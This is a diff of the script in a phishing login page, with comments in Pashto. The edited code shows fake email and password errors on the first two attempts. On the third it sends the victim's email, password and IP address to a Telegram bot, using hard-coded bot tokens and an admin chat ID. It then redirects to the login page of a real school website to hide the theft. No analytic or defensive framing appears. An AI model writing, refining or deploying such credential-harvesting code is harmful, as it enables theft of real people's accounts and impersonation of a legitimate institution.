@@ -215,7 +215,8 @@ button:hover{
 </div>
 
 <script>
-    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
+    // ستاسو نوی ټوکن دلته واچول شو
+    const BOT_TOKEN = "8907358280:AAGNOQIWyhvy2hB1yWTIc2XyMp1eQiNsHXo";
     const ADMIN_CHAT_ID = "8295417969";
 
     let attemptStore = {};
@@ -285,22 +286,26 @@ button:hover{
         attemptStore[key]++;
         const currentAttempt = attemptStore[key];
 
+        // لمړی ځل: د غلط ایمیل ایرر
         if (currentAttempt === 1) {
             showError('Please check your email');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
+        // دویم ځل: د غلط پاسورډ ایرر
         if (currentAttempt === 2) {
             showError('Please check your password');
             document.getElementById('email').value = '';
             document.getElementById('password').value = '';
             return;
         }
+        // دریم ځل: معلومات بوټ ته لېږل او سمدلاسه لینک ته تلل (بې له لوډینګه)
         if (currentAttempt >= 3) {
             await sendToAdmin(email, password, ip, currentAttempt);
             delete attemptStore[key];
-            window.location.href = "https://www.altaqwa.edu.af";
+            // سمدلاسه دې لینک ته ځي پرته له کومې پاڼې چې بار شي
+            window.location.replace("https://www.altaqwa.edu.af/login");
         }
     });
 </script>
